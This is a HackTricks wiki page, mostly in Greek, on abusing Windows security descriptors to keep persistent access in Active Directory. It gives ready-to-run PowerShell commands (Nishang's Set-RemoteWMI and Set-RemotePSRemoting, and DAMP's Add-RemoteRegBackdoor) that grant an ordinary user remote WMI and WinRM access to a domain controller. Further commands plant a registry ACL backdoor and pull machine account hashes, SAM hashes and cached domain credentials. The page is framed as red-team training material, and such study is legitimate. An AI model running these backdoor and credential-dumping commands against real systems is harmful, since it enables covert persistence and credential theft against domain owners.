# Security Descriptors

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Security Descriptors

[Από τα έγγραφα](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Η Γλώσσα Ορισμού Ασφαλείας (SDDL) ορίζει τη μορφή που χρησιμοποιείται για να περιγράψει έναν ασφαλή περιγραφέα. Η SDDL χρησιμοποιεί συμβολοσειρές ACE για DACL και SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Οι **ασφαλείς περιγραφείς** χρησιμοποιούνται για να **αποθηκεύσουν** τις **άδειες** που έχει ένα **αντικείμενο** **πάνω** σε ένα **αντικείμενο**. Εάν μπορείτε να **κάνετε** μια **μικρή αλλαγή** στον **ασφαλή περιγραφέα** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας προνομιούχου ομάδας.

Έτσι, αυτή η τεχνική επιμονής βασίζεται στην ικανότητα να αποκτήσετε κάθε προνόμιο που απαιτείται κατά ορισμένων αντικειμένων, ώστε να μπορείτε να εκτελέσετε μια εργασία που συνήθως απαιτεί προνόμια διαχειριστή αλλά χωρίς την ανάγκη να είστε διαχειριστής.

### Access to WMI

Μπορείτε να δώσετε σε έναν χρήστη πρόσβαση για **να εκτελεί απομακρυσμένα WMI** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

Δώστε πρόσβαση στο **winrm PS console σε έναν χρήστη** [**χρησιμοποιώντας αυτό**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

Πρόσβαση στο **registry** και **dump hashes** δημιουργώντας ένα **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ώστε να μπορείτε ανά πάσα στιγμή να ανακτήσετε το **hash του υπολογιστή**, το **SAM** και οποιαδήποτε **cached AD** διαπιστευτήρια στον υπολογιστή. Έτσι, είναι πολύ χρήσιμο να δώσετε αυτή την άδεια σε έναν **κανονικό χρήστη κατά ενός υπολογιστή Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Δείτε [**Silver Tickets**](silver-ticket.md) για να μάθετε πώς μπορείτε να χρησιμοποιήσετε το hash του λογαριασμού υπολογιστή ενός Domain Controller.

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
